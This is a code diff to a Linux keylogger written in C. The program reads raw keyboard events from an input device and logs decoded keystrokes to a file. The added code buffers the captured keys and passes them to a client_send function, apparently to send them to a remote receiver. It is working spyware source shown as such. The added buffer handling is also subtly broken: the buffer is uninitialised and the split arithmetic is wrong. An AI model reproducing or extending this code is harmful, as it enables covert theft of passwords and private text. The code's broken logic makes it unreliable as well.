@@ -3,6 +3,7 @@
 #include <unistd.h>
 #include <signal.h>
 #include <stdio.h>
+#include <string.h>
 #include <fcntl.h>
 #include <stdlib.h>
 #include <linux/input.h>
@@ -86,14 +87,16 @@ char *keys[] = {
   };
 
 void safebreak(){
-        exit(0);
+	exit(0);
 }
 
 void main()
 {
   int count = 0;
+  int dif;
   // open output text file to store decoded keystrokes
   FILE *output;
+  char message[128];
   output = fopen("output.txt", "w+");
   printf("Opened\n");
 
@@ -103,14 +106,11 @@ void main()
   int device = open(keyboardPath_EVENTUALLYREPLACE, O_RDONLY);
   struct input_event inpEvent;
 
-  // I don't know why we would need this, but a lot of code i read contained this to cancel loop when Ctrl-C is pressed; that already happens though
-
   // safely break from loop when Ctrl-C is pressed
   signal(SIGINT, safebreak);
 
   while(1)
   {
-    printf("LOOP");
     read(device, &inpEvent, sizeof(inpEvent));  
     //if the type of the event is a state change (like of a keyboard)
     if (inpEvent.type == 1 && inpEvent.value == 1)
@@ -118,6 +118,18 @@ void main()
       //if the event code indicates a standard keyboard button
       if (inpEvent.code > 0 && inpEvent.code <= TOT_KEYS)
       {
+		if (strlen(message) + strlen(keys[inpEvent.code]) < 128) 
+		{
+			strcat(message, keys[inpEvent.code]);
+		}
+		else 
+		{
+			dif = (strlen(message) + strlen(keys[inpEvent.code])) - 128;
+			strncat(message, keys[inpEvent.code], dif);
+			client_send(message);
+			strcpy(message, "");
+			strcat(message, keys[inpEvent.code]+dif);
+		}
         //output the code of the standard keyboard button
         fprintf(output, "%s\n", keys[inpEvent.code]);
         count++;
